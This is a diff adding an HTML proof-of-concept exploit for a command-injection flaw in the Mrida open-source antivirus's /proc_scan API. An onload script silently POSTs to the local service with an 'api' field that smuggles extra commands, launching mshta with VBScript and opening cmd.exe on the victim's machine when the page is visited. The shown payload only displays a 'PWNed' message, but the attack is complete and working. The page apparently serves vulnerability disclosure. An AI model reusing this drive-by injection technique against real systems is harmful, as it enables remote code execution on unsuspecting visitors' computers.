@@ -1,0 +1,26 @@
+<html>
+    <head>
+       <title>Mrida Remote code execution PoC</title>
+    </head>
+    <body onload="pwn()">
+<!--
+Mrida is an open source AV that uses yara rules and has an API
+This API call /proc_scan has a command injection vulnerability
+where the user supplied value "api" is taken from the request
+on line 169 of Mrida/Mrida/mrida.cpp and then used in a system
+call on line 179. The vulnerable code can be found at:
+https://github.com/VISWESWARAN1998/Mrida/blob/5d96153eb7d2d3833f64a907e18c3c73c8942c62/Mrida/Mrida/mrida.cpp#L164
+-->
+        <p><blink><h1>Hello, hello, hello!</h1></blink></p>
+        <p>Better check on that AV, huh? It might just look like this now:</p>
+    <script>
+       function pwn() {
+             var xhr = new XMLHttpRequest();
+             xhr.open("POST", "http://127.0.0.1:5660/proc_scan", true)
+             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+             xhr.send('api=+%26+start+mshta+vbscript:Execute("msgbox+""PWNed+by+@Wireghoul"",vbmodal:close")+%26+start+cmd.exe&type=gui');
+       }
+    </script>
+        <img src="http://justanotherhacker.com/files/mrida-pwned-sm.png">
+    </body>
+</html>
